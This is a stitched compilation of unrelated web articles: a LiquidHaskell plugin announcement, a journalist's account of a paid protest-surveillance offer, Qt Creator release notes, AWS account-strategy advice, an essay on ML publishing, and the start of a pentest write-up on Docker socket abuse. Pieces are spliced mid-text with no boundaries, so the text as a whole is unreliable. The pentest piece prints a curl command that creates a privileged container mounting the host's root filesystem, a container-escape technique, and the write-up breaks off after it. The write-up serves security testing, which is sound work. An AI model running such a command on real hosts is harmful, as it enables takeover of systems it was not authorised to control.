<li><p>LH had <em>no integration</em> with the standard compilation cycle; it was difficult to get robust, <strong>development-time feedback</strong> using <code>ghci</code> based tools.</p></li>
</ol>
<p>I’m delighted to announce the release of <a href="http://ucsd-progsys.github.io/liquidhaskell/">LH version 0.8.10.2</a>.</p>
<p>Thanks to the ingenuity and tireless efforts of our friends <a href="http://www.alfredodinapoli.com/">Alfredo Di Napoli</a> and <a href="https://www.andres-loeh.de/">Andres Loh</a> at <a href="http://www.well-typed.com/">Well-Typed</a> this new version solves all three of the above problems in a single stroke, making it vastly simpler (dare I say, quite straightforward!) to run LH on your Haskell code.</p>
<!-- more -->
<p>Alfredo and Andres’ key insight was that all the above problems could be solved if LH could be re-engineered as a <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/extending_ghc.html#compiler-plugins">GHC Compiler Plugin</a> using hooks that GHC exposes to integrate external checkers during compilation. I strongly encourage you to check out Alfredo’s talk at the <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">Haskell Implementor’s Workshop</a> if you want to learn more about the rather non-trivial mechanics of how this plugin was engineered. However, in this post, lets look at <em>how</em> and <em>why</em> to use the plugin, in particular, how the plugin lets us</p>
<ol type="1">
<li><p>Use GHC’s dependency resolution to analyze entire packages with minimal recompilation;</p></li>
<li><p>Ship refined type specifications for old or new packages, and have them be verified at client code;</p></li>
<li><p>Use tools like <code>ghci</code> based IDE tooling (e.g.&nbsp;<code>ghcid</code> or <code>ghcide</code> to get interactive feedback),</p></li>
</ol>
<p>all of which ultimately, I hope, make Liquid Haskell easier to use.</p>
<h2 id="analyzing-packages">1. Analyzing Packages</h2>
<p>First, lets see a small “demo” of how to <em>use</em> the plugin to compile a small <a href="https://github.com/ucsd-progsys/lh-plugin-demo"><code>lh-plugin-demo</code></a> package with two modules</p>

<p>which defines a function <code>incr</code> that consumes and returns positive integers, and</p>

<p>which imports <code>Demo.Lib</code> and uses <code>incr</code>.</p>
<h3 id="updating-.cabal-to-compile-with-the-lh-plugin">Updating <code>.cabal</code> to compile with the LH plugin</h3>
<p>To “check” this code with LH we need only tell GHC to use it as a plugin, in two steps.</p>
<ol type="1">
<li>First, adding a dependency to LH in the <code>.cabal</code> file (or <code>package.yaml</code>)</li>
</ol>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell &gt;= 0.8.10</code></pre>
<ol start="2" type="1">
<li>Second, tell GHC to use the plugin</li>
</ol>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>That’s it. Now, everytime you (re-)build the code, GHC will <em>automatically</em> run LH on the changed modules! If you use <code>stack</code> you may have to specify a few more dependencies, as the various packages are not (yet) on stackage, as shown in the <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml">demo <code>stack.yaml</code></a>. No extra dependencies are needede if you use <code>cabal-v2</code>. In both cases, you can use the respective files <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml.github"><code>stack.yaml</code></a> and <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/cabal.project.github"><code>cabal.project</code></a> point to specific git snapshots if you want to use the most recent versions. If you clone the repo and run, e.g.&nbsp;<code>cabal v2-build</code> or <code>stack build</code> you’ll get the following result, after the relevant dependencies are downloaded and built of course…</p>

<h3 id="benefits">Benefits</h3>
<p>There are a couple of benefits to note immediately</p>
<ul>
<li><p>A plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the installing <em>and</em> checking!</p></li>
<li><p>No need to separately <em>install</em> LH; its part of the regular build.</p></li>
<li><p>GHC’s recompilation machinery ensures that only the relevant modules are checked, e.g.&nbsp;the second time round, LH did not need to analyze <code>Lib.hs</code> only <code>Client.hs</code></p></li>
</ul>
<h2 id="shipping-specifications-with-packages">2. Shipping Specifications with Packages</h2>
<p>While the above is nice, in principle it could have been done with some clever <code>makefile</code> trickery (perhaps?). What I’m much more excited about is that now, for the first time, you can <em>ship refinement type specifications within plain Haskell packages</em>.</p>
<p>For example, consider a different <a href="https://github.com/ucsd-progsys/lh-plugin-demo-client">lh-plugin-demo-client</a> package that uses <code>incr</code> from <code>lh-plugin-demo</code>:</p>

<p>Again, the <code>lh-plugin-demo-client.cabal</code> file need only specify the various dependencies:</p>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell,
      lh-plugin-demo</code></pre>
<p>and that GHC should use the plugin</p>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>and lo! a plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the rest.</p>

<h3 id="prelude-specifications">Prelude Specifications</h3>
<p>Did you notice the strange <code>liquid-base</code> dependency in the cabal files?</p>
<p>Previously, LH came installed with a “built-in” set of specifications for various <code>prelude</code> modules. This was <em>hacked</em> inside LH in a rather unfortunate manner, which made these specifications very difficult to extend.</p>
<p>Moving forward, all the refinement specifications e.g.&nbsp;for <code>GHC.List</code> or <code>Data.Vector</code> or <code>Data.Set</code> or <code>Data.Bytestring</code> simply live in packages that <em>mirror</em> the original versions, e.g.&nbsp;<code>liquid-base</code>, <code>liquid-vector</code>, <code>liquid-containers</code>, <code>liquid-bytestring</code>. Each <code>liquid-X</code> package directly <em>re-exports</em> all the contents of the corresponding <code>X</code> package, but with any additional refinement type specifications.</p>
<p>Thus, all the refined types for various prelude operations like <code>(+)</code> or <code>(-)</code> or <code>head</code> and so on, now ship with <code>liquid-base</code> and we add that dependency <strong>instead of</strong> base. Similarly, if you want to verify that <em>your</em> code has no <code>vector</code>-index overflow errors, you simply build with <code>liquid-vector</code> <strong>instead of</strong> <code>vector</code>! Of course, in an ideal, and hopefully not too distant future, we’d directly include the refinement types inside <code>vector</code>, <code>containers</code> or <code>bytestring</code> respectively.</p>
<h3 id="benefits-1">Benefits</h3>
<p>So to recap, the plugin offers several nice benefits with respect to <em>shipping specifications</em></p>
<ul>
<li><p>Refined signatures are bundled together with packages,</p></li>
<li><p>Importing packages with refined signatures automatically ensures those signatures are checked on client code,</p></li>
<li><p>You can (optionally) use refined versions of <code>prelude</code> signatures, and hence, even write refined versions of your favorite <em>custom preludes</em>.</p></li>
</ul>

<p>I saved <em>my</em> favorite part for the end.</p>
<p>What I have enjoyed the most about the plugin is that now (almost) all the GHC-based tools that I use in my regular Haskell development workflow, automatically incorporate LH too! For example, reloading a module in <code>ghci</code> automatically re-runs LH on that file.</p>
<h3 id="ghcid"><code>ghcid</code></h3>
<p>This means, that the mega robust, editor-independent <code>ghcid</code> now automatically produces LH type errors when you save a file. Here’s <code>ghcid</code> running in a terminal.</p>

<p>While covering Portland protests as an independent journalist, being filmed while working has never really bothered me. My full name and a photo of me is available publicly and, honestly, I’m much more concerned with protecting myself from riot control agents like tear gas and impact munitions used by Portland police.</p>



<p>For others in the crowd, however, protecting themselves from being filmed is a necessity. In the hands of the wrong people, footage exposing their identity can be (and is) used to threaten them online and commit very real acts of violence against them and their acquaintances. It can cause people to lose their jobs and their homes, depending on how their employers and landlords feel about what they’re doing in the footage. (There is a reason so many protesters dress in head-to-toe black, and why some people walk through the crowd with black umbrellas to block people’s phones as they attempt to film the crowd.)</p>



<p>That’s why, when I received the following email on Tuesday, Aug. 18, at 11:41 p.m. from cryptonater@protonmail.com, my stomach dropped:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-1.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>Someone with the username “Cryptonater” was asking me if I’d like to receive payment in exchange for taking photos and videos of faces of members of the press at Portland protests — specifically “pro-Antifa press and those posing as press.” According to their email, their objective was to create a database of people whose faces I recorded, then perform background checks and “analysis” on them.</p>



<p>I took a screenshot of the email and sent it to a group chat of fellow journalists, asking — essentially — “what the fuck?” No journalist with a <em>modicum </em>of integrity would ever participate in an agreement like this. It goes against a commonly shared journalistic code of ethics (and I was fairly certain was unconstitutional, if connected in any way to a governmental agency). </p>



<p>After discussing the email with the group, I decided to reply to the email first before sharing it with fellow journalists on Twitter. The goal was to see what additional information Cryptonater would send me before they inevitably realized I wasn’t down to secretly surveil people. </p>



<p>On Wednesday, Aug. 19, I replied, asking Cryptonater what other opportunities they were offering:</p>

<p> (<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cata-reply-1-1.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>Then I waited. While waiting, I wondered why Cryptonater had chosen to email me. Was it because I had a relatively low follower count on Twitter? Was it because, only a day prior, I had posted a tweet (okay, <em>complained</em>) about news outlets requesting to use my reporting without payment? (Fact: being credited by Good Morning America might feel sweet, but it does not pay to refill your prescriptions.) Was Cryptonater just a troll with too much time on their hands?</p>



<p>By Aug. 20, I figured Cryptonater had given up on hiring me, so I posted their original email and my reply to Twitter: </p>

<p>Almost immediately, responses started coming in, including worried replies from other people covering Portland protests. Twitter users were tagging the American Civil Liberties Union (ACLU) and Society of Professional Journalists. The most common replies were iterations of “this is disturbing” and “what the fuck?”</p>



<p>After sending the tweet, I figured I had finished the task of making fellow members of the press aware that someone was trying to watch them (or at least claiming to). I also gave up on ever hearing back from Cryptonater.</p>



<p>Then, at 11:16 a.m. the following day, I received a response:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-2.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>This lengthy (605-word) email from Cryponator can be distilled into 10 key points: </p>



<ol><li>An organization was claiming to be building a national database of people at protests, specifically those identifying themselves as press but not employed by a news organization; </li><li>They’re already doing this by scraping footage from social media feeds like Facebook, Twitter, Periscope, Twitch and Instagram;</li><li>They’re working on a “biometrics algorithm” that can identify people based on “walking style, filming style, voice, facials, build, and other identifying marks like tattoos;”</li><li>This information is being bundled for sale to law enforcement, Department of Homeland Security and Department of Defense;</li><li>They are paying $20 per minute of footage (amounting to ~$10,000 for nine hours of protest coverage);</li><li>If willing to travel to other cities, that payment doubles to $40 per minute for footage and includes paying for travel costs and 50% payment upfront;</li><li>Hirees must sign an non-disclosure agreement;</li><li>The organization provides medical and liability insurance for any injuries sustained;</li><li>Their stated goal is to “deconstruct extremism by identification and then neutralization” (<em>WHAT DOES “neutralization” MEAN?</em>) of “pseudo-press” and individuals who engage in “rioting and crime;”</li><li>They already have freelances filming at protests around the country and are seeking to expand their teams in Portland and Seattle.</li></ol>



<p>This email prompted two responses. First,<em> I want to throw up</em>. Second, there’s no way this is for real. Who has this kind of money? What organization could possibly think they could get away with this? And, if in cooperation with Portland Police Bureau, this would be <em>super illegal</em>. </p>



<p>In July, at the request of the ACLU of Oregon, a Multnomah County judge <a rel="noreferrer noopener" href="https://aclu-or.org/en/press-releases/circuit-court-issues-restraining-order-police-surveillance-protesters-response-aclu" target="_blank">issued a temporary restraining order</a> against Portland Police Bureau, barring them from using livestreams as a means of surveillance over local protesters, citing an Oregon law prohibiting law enforcement from “collecting or maintaining information about the political, religious or social views, associations or activities of people who are not suspected of criminal activity.” In Oregon, law enforcement may not collect footage of protesters unless they are suspected of committing a crime.</p>



<p>Cryptonater also used the term “pseudo-press,” likely in response to an increase in the number of people at Portland protests identifying themselves as press. Following a different request in July by the ACLU of Oregon, a U.S. District Judge <a rel="noreferrer noopener" href="https://aclu-or.org/en/press-releases/judge-grants-preliminary-injunction-aclu-case-protect-journalists-and-legal-observers" target="_blank">issued a preliminary injunction</a> blocking Portland police from “dispersing, arresting, threatening to arrest, or targeting journalists or legal observers” at protests, including anyone wearing identifying markers like press passes and badges. Perhaps in an attempt to increase their safety, more people began appearing at Portland protests identified as press. (If that was their aim, it was ineffective; law enforcement officers continued targeting press and legal observers at protests, leading the ACLU of Oregon to demand federal agents with the Department of Homeland Security and U.S. Marshals Service <a rel="noreferrer noopener" href="https://wordpress.com/block-editor/post/catagaitan.com/1265" target="_blank">be sanctioned and held in contempt</a>.)</p>



<p>I couldn’t imagine why an organization claiming to operate at such a grand level and with such advanced technology would have sent this email to me without catching my tweet. But, if on the off chance they were for real, I wanted to collect as many words from them as possible before they found me out. </p>



<p>An hour later, I sent the following response, aiming to sound suggestible and strapped for cash (honestly, who isn’t right now?):</p>

<p>My reply had three questions: How would they recommend responding if someone at a protest caught me filming them, how does their video technology work, and what larger organization are they working for? </p>



<p>To my surprise, they got back to me within a few hours with another lengthy (1,085-word) response:</p>

<p>(<a href="https://catalinagaitancom.files.wordpress.com/2020/08/cryptonater-3.docx" target="_blank" rel="noreferrer noopener">Text version of email available here</a>.)</p>



<p>For anyone unwilling to read 1,085 words, here are this email’s 10 key points:</p>



<ol><li>If hired on, I would continue reporting at Portland protests like I usually do, but wear a pea-sized recording device that looks like a button concealed in a helmet or my clothing;</li><li>This recording device captures both audio and video in low light, and has “millimeter wave capture which allows rendering of faces even if they are wearing cloth masks;”</li><li>The device uses technology from FLIR (a designer of &nbsp;thermal imaging cameras and sensors) and Axon (a company based in Scottsdale, Arizona that develops technology and weapons for law enforcement);</li><li>I would also be equipped with a disposable cell phone with an “SoS text button” that I could press in duress, at which time they would “create a situation” to extract me safely without “compromising me,” including a planned ahead “pseudo-arrest” with local law enforcement or a feigned injury, where “someone dressed as an EMT” would escort me out;</li><li>They hire multiple individuals who do not know each other to record at the same time, along with an analyst and security team “dressed up similar to the protesters and in plain clothes” who would follow me at a distance;</li><li>They say to date, no one they’ve contracted to use this technology has been identified;</li><li>If I was willing to participate, I would attend an in-person meeting at their field office location in Portland or another “major city” of my choosing, sign an NDA and undergo a two-week paid training process;</li><li>Their organization is a private registered corporation in the state of Delaware that monitors and tracks “many freelance press;” and</li><li>The organization expects to see between 10 and 18 months of “continued unrest throughout major urban areas in the US.”</li></ol>



<p>After reading this, my desire to throw up increased ten-fold. But I also started feeling more and more as if this was an elaborate prank. I decided to just ride the wave and sent back this response a few minutes later agreeing to meet with them: </p>

<p>Unfortunately, by 4:06 p.m. on Friday, they claimed to have finally found my tweet from Aug. 20. (What had taken them so long?) Cryptonater sent me the following response, attaching a weirdly blurred screenshot of my tweet: </p>

                                Wednesday August 26, 2020 by <a href="https://www.qt.io/blog/author/eike-ziller">Eike Ziller</a> | <a href="#commento">Comments</a>

<!--more--><h4>General</h4>
<p>Qt Creator supports setting multiple shortcuts for the same action now. Do you ever mix up shortcuts because your second-favorite editor uses different ones than Qt Creator? Just open <em>Preferences</em> &gt; <em>Environment</em> &gt; <em>Keyboard</em>, find the action and press <em>Add</em> (as long as you do not introduce a conflict with another shortcut). Personally I added some Emacsey shortcuts for splitting and some other actions to my configuration. (Since I am on a Mac, Ctrl+X is free to use for me.)</p>
<p>If you wonder where some items from the <em>Window</em> menu went: We moved them to a new <em>View</em> menu, which seems to be common to have.</p>
<h4>Editing</h4>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">We updated LLVM for the C++ code model to LLVM 10, implicitly improving support for C++20 features. The code model also received many smaller fixes and improvements. Please refer to the <a href="https://code.qt.io/cgit/qt-creator/qt-creator.git/tree/dist/changes-4.13.0.md?h=4.13#n34" rel=" noopener">change log</a> for details.<br></span></span></p>

<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">If you program in Python, you might find a new feature useful: The editor has a new tool button that allows you to open Python interactively, optionally importing the current file as a module, so you can directly start testing what you just wrote.</span></span></span></p>
<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">For QML we fixed some issues with Qt 5.15, and added support for required list properties.</span></span></span></p>
<h4>Projects</h4>
<p>Many thanks to <span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">Alexis Jeandet for adding initial support for the <a href="https://mesonbuild.com/" rel=" noopener">Meson build system</a>!<br>Also many thanks to <span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">IncrediBuild for contributing <a href="https://incredibuild.atlassian.net/wiki/spaces/IUM/pages/19202836/IncrediBuild+for+Qt+Creator" rel=" noopener">their Qt Creator integration</a>!</span><br>(<span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">You need to open <em>Help</em> &gt; <em>About Plugins</em> (or <em>Qt Creator</em> &gt; <em>About Plugins</em> on macOS) and enable these plugins before you can use them.</span>)</span></span></p>
<p><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">We completely revamped the CMake support in Qt Creator. One of the biggest issues with CMake support was that Qt Creator had its own idea about the build configuration of a project, and that could conflict heavily with an existing build, or could cause problems if the configuration was changed on the command line later. In the new version, Qt Creator accepts an existing build configuration as the truth, no matter what for example the settings for CMake in the kit are.</span></span><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><span data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"></span></span> Qt Creator still reads the configuration, and provides an editor for it, but it will never complain about conflicts anymore. If you want to configure the build for a project from scratch, you have the option to pass any CMake variables that you like, pre-filled with the configuration from the kit. Note that Qt Creator now requires CMake 3.14 or later.</p>
<p>Our auto-test integration supports the <a href="https://github.com/catchorg/Catch2" rel=" noopener">Catch2</a> testing framework now.</p>
<h4>Targets</h4>
<p>QML debugging and profiling on Android works again, and we fixed issues with debugging on x86 and armv7 architectures and the emulator.</p>
<p>We fixed an issue that could lead to the debugger taking a very long time to start up on iOS devices.</p>
<p>Please have a look at our <a href="https://code.qt.io/cgit/qt-creator/qt-creator.git/tree/dist/changes-4.13.0.md?h=4.13" rel=" noopener">change log</a> for an overview of all the other fixes and improvements that are included in Qt Creator 4.13.</p>
<h4>Get Qt Creator 4.13</h4>
<p>The opensource version is available on the <a href="https://www.qt.io/offline-installers">Qt download page under "Qt Creator"</a>, and you find commercially licensed packages on the <a href="https://login.qt.io/">Qt Account Portal</a>. Qt Creator 4.13 is also available as an update in the online installer. Please post issues in our <a href="https://bugreports.qt.io/projects/QTCREATORBUG">bug tracker</a>.

					<div><p><span>Companies often fall into the trap of building standardized infrastructure themselves, then offer it to their teams to run their workloads on. For example:</span></p>
<ul>
<li><span>Compute, IaaS, which let teams spin up and down compute;</span></li>
<li><span>A mix of IaaS and DBaaS, making sure that databases are managed;</span></li>
<li><span>Platform as a Service to let developers build and deploy their app all by themselves without having to maintain the underlying infrastructure;</span></li>
<li><span>Container platforms like Kubernetes to let teams build and deploy anything on it, as long as it can be deployed as a container</span></li>
</ul>
<p><span>The most complex, but most powerful option lets your teams choose individually what systems and deployment technologies they want to use. You can give them full access to the products and services a cloud provider is offering. Instead of only providing a subset of the offerings, like a Kubernetes cluster, you can give teams their own AWS accounts to build and deploy their applications on. If they want to use Kubernetes for example, they can spin up their own Kubernetes cluster. This also implies that the teams need to take ownership of it. They’ll have to make a well-informed decision about the technology they want to run and support. The teams will not only need to provision it, but will also need to ensure they can manage it. Managing a Kubernetes cluster is a lot of work, and maybe they don’t need such complex features or don’t want to spend resources on it. Other managed options like ECS, Elastic Beanstalk, or building AMIs with Packer can be a better option as they don’t require any development resources.</span></p>
<p><span>When implemented correctly within the organization the most noticeable will be the increase in developer velocity and autonomy. Over the years we have helped implement this strategy in various startups and enterprises and have seen a lot of amazing things happen. Below we have summarized a few key points on how to make this strategy successful within your organization using Amazon Web Services (AWS).</span></p></div>

					<div><p><span>When giving users privileged access to a new AWS account, you’ll want to make sure that users cannot use unauthorized services, or create other users with full administrator privileges. A solution to restrict user access is to use Permission Boundaries in IAM.</span></p><p><span>A Permission Boundary can ensure that a user has still full access to the AWS account, but is bound to some limits. When the user tries to create a new IAM user or a new admin role, it’ll get a permission denied when “deny rules” are specified in the Permission Boundary. That way the users can still manage the full AWS account, but can’t circumvent policies and procedures set by the enterprise.</span></p></div>

Identity Provider software can help you with this. Software like Okta and Onelogin can make it easy for users to log in to different AWS accounts. With a single click on a button, they can log in to one or the other account, making it easy to give out and remove access to current and new users.</span></p><p><span>AWS also has “AWS Single Sign-On” which can provide the same capabilities, but with an enterprise directory like Active Directory where the users are stored.</span></p></div>

Security tools to monitor &amp; remediate these compliance issues will be required to keep your accounts safe. AWS Config can be used to invoke rules on config changes to alert and remediate non-compliance resources within Amazon accounts.</span></p><p><span>Amazon services are getting more and more cross-account capabilities to provide cross-account security monitoring and compliance. Besides security, AWS Backups for example can roll out backup policies over all the AWS accounts in your organization.

<p>I am on the NeurIPS advisory board and on the ICLR board, and I have been involved in the organization of these conferences at all levels, for many years. I have been part of discussions with program committees about how to improve these conferences, but usually the discussions are about incremental changes. I wonder if it may be time for rethinking the overall publication process in the field of machine learning (ML). </p>



<p>The landscape has changed in the last couple of decades. In great part this is thanks to the popularity of arXiv, which has greatly accelerated the cycle of information discovery and dissemination. We now have many conferences publishing ML papers (for example my group publishes mostly at NeurIPS, ICML and ICLR, but also in major conferences in computer vision and natural language processing), which means we go from one deadline to the next every two months, roughly. </p>



<p>The research culture has also changed in the last few decades. It is more competitive, everything is happening fast and putting a lot of pressure on everyone, the field has grown exponentially in size, students are more protective of their ideas and in a hurry to put them out, by fear that someone else would be working on the same thing elsewhere, and in general a PhD ends up with at least 50% more papers than what I gather it was 20 or 30 years ago. </p>



<p>The field has almost completely switched to a conference publication model (in fact a large part of computer science has done so too), and each conference paper does not get the chance to be cleaned up as well as a typical journal paper, rarely benefitting from the repeated iterations to improve the paper which is typical of journals. So we are more productive, on the surface, but this stress, productivity fast pace have a price on the depth and quality of the papers we produce. Many papers end up being submitted that in the past would not have been submitted. They may contain errors, lack in rigour or simply be rather incremental. </p>



<p>In the rush preceding a conference deadline, many papers are produced, but there is not enough time to check things properly and the race to put out more papers (especially as first or equal-first author) is humanly crushing. On the other hand, I am convinced that some of the most important advances have come through a slower process, with the time to think deeply, to step back, and to verify things carefully. Pressure has a negative effect on the quality of the science we generate. I would like us to think about <a href="http://slow-science.org/">Slow Science</a> (check their manifesto!).</p>



<p>Motivated by this feeling, I have been thinking of a potentially different publication model for ML, which has some similarity to what has been experimented elsewhere (e.g., <a href="https://vldb.org/">VLDB</a>). I shared these thoughts with the NeurIPS board, and I share them to you here. Here is the content of my message to the board:</p>



<div><div>
<p><em>I would like to see more discussion about ideas to improve the  publication process as a whole in ML, with reviewing being a crucial  element. I’d certainly like to hear your thoughts.<br>My  feeling is that besides the poor incentives for reviewing, our current  system incentivizes incremental work and creates a lot of pressure and  stress on grad students (and researchers in general) to submit as many  papers as possible at each deadline. Students sometimes come to me two months  before a deadline asking if I have ideas of something which could be  achieved in two months.</em></p>



<p><em>In addition, we now  have a bunch of ML conferences (in particular NeurIPS, ICML and ICLR)  with a strong overlap in their content and community, so people just  resubmit their rejected work to the next conference and draw a new  sample of reviewers (and because of the noise, it means a paper  eventually gets accepted, after using a lot of resources from the  community). Plus the fact that all good reviewers are in demand at very specific weeks of the year makes it harder for area chairs to find the  appropriate reviewer for their paper (unlike what happens with  journals).</em></p>



<p><em>This brings to mind a different  model, one where papers are first submitted to a fast turnaround journal  (which could be JMLR in this case) and program committees of each  conference then pick the papers they like the most from the list of  already accepted and reviewed (and scored) papers (assuming the authors  are interested in having their work presented at a conference). </em></p>



<p><em>In  the old days, conferences were important to speed up the research cycle  and have a fast turnaround of ideas. But now we have arXiv which plays  that role much better, so the main role of conferences, besides the socializing, should be to select work to be highlighted and presented  orally, to create a diversified offer of the best and most important ideas arising in our community, to synchronize researchers around this progress. It doesn’t even have to be super-recent work, it could be work  which got done 1 or 2 years ago and is only recently picking up steam  in terms of impact. The deadline system of conferences creates an  incentive to submit half-baked work (and often not even fix things  properly later if the paper is accepted, rather move on to another  publication). If there is an implicit soft deadline (because if I submit  my paper now to JMLR there is uncertainty as to when it will be  accepted and available for selection by a conference) then there is an  incentive to continue working on the paper until it is better polished,  rather than submit it too early. In addition, the richer iterative  feedback of the journal process should lead to higher-quality results at  the end of the day. And having our work in journal form would make it  easier for ML researchers to collaborate with researchers in other  disciplines who value journals and not conferences.</em></p>
</div></div>



<p>I guess this is the beginning of a discussion, and the many researchers who have participated in the conference and journal process in ML would certainly have interesting things to say towards improving this process. And everyone in this community who submits or reviews papers has information about what works and what doesn’t. Let’s put our heads together and explore how we can at the same time improve the quality of our science and improve our lives as human beings.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				    
<p>Legend has it that before his death, Harry Houdini once said: “<em>if it is truly possible for someone to return from the afterlife, I will</em>”. Despite of the fact he was a great illusionist and escape artist, it seems this last proof has revealed to be very hard, even for him. Much simpler trying to escape out of a container. Of course a docker container 🙂 … our topic for today.</p>



<p>The danger of exposing “<code>docker.sock</code>” to a docker container is well-known and the security literature is full of examples (one is <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">here</a>) leading to container escape and privilege escalation issues in the host machine. But sometimes this is required (if not even necessary) for legitimate purposes, like creating other containers or pushing configuration settings. While the docker security guidelines advocate to not share the Docker UNIX socket inside a container, at the same time the project developers do not give any advice on how to secure such a kind of configuration whenever it is needed for “<em>good reasons</em>”. And that’s why so many companies that adopt docker and deliver services based on it, still today, suffer from this problem.</p>



<p>For example, last year a customer of us has contracted a security firm to check the robustness of their docker infrastructure. One of their main findings was the file “<code>docker.sock</code>” being mounted within some of their containers, which of course was a sufficient condition to compromise the entire host operating system. In the absence of a strong solution coming from the community, our customer has decided to build its own solution. They created a reverse proxy in front of the Docker UNIX socket file that would add authentication/authorization, and would prevent insecure utilization of the Docker socket itself.</p>



<p>Then they asked us to test the new architecture. This is the story of how the sympathetic Red Timmy has managed to bypass it.</p>



<h3>The architecture</h3>



<p>Before moving forward, we must explain a bit the implementation we have been called to test and a picture should make the job easy enough.</p>



<figure><img loading="lazy" width="1024" height="511" src="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png" alt="" srcset="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png 1024w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-300x150.png 300w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-768x383.png 768w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker.png 1099w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In this architecture there are two UNIX socket files now:</p>



<ul><li><code>/var/run/docker.sock</code> is not exposed within the docker containers anymore. It is readable and writable only for the “<code>root</code>” user and the “<code>docker</code>” group. As you already know the docker engine uses it directly.</li><li><code>/var/run/somethingelse.sock</code> is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “<code>/var/run/docker.sock</code>”. The docker engine remains the only one able to do that.</li></ul>



<p>Then a reverse proxy, running as a privileged user, sits in the middle of these two UNIX socket files. It fetches requests from “<code>/var/run/somethingelse.sock</code>” and determines whether or not these must be forwarded to “<code>/var/run/docker.sock</code>” based on a whitelist of authorized values preemptively saved in a configuration file. For example, a request could be let pass through only if it matches a specific HTTP method (<em>GET</em>, <em>POST</em>, etc…), path (for example “<code>/containers/create</code>”) and/or JSON body.</p>



<p>At the same way the reverse proxy returns the replies from “<code>docker.sock</code>” to “<code>somethingelse.sock</code>” once they are in the pipeline. At first glance the workflow looked fine and flawless.</p>



<h3>Let the dance begin</h3>



<p>Ok, all clear. We have been provided with access to a docker container:</p>



<div><div>
<div><p><code>[root@dockerhost ~]# <strong>docker exec -it 7c4e2742becb bash</strong><br>bash-4.4$</code> &lt;-- container command prompt</p></div>
</div></div>







<p>Also our handsome UNIX socket file is where it is supposed to be:</p>



<p><code>bash-4.4$ <strong>ls –al /var/run/somethingelse.sock</strong><br>srw-------  1 unpriv root 0 Feb 13 11:31 somethingelse.sock</code></p>



<p>Now we must find a way to escape out of there. First thing we try is to leverage the “old” trick as documented in the report that our customer has received from the security firm they had originally contracted:</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong> "</strong>AttachStdout<strong>"</strong>: true,<strong> "</strong>AttachStderr<strong>"</strong>: true,<strong> "</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash”,”Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost<strong>/containers/create</strong></code></p>



<p>The main difference in our command is that instead of establishing a communication channel with “<code>/var/run/docker.sock</code>” (not mounted in the container) we target “<code>/var/run/somethingelse.sock</code>” (which is instead mounted in the container). All the hacking steps are performed with curl. Specifically, as we are communicating with a UNIX domain socket, the “<code>--unix-socket &lt;filename&gt;</code>” option is adopted.</p>



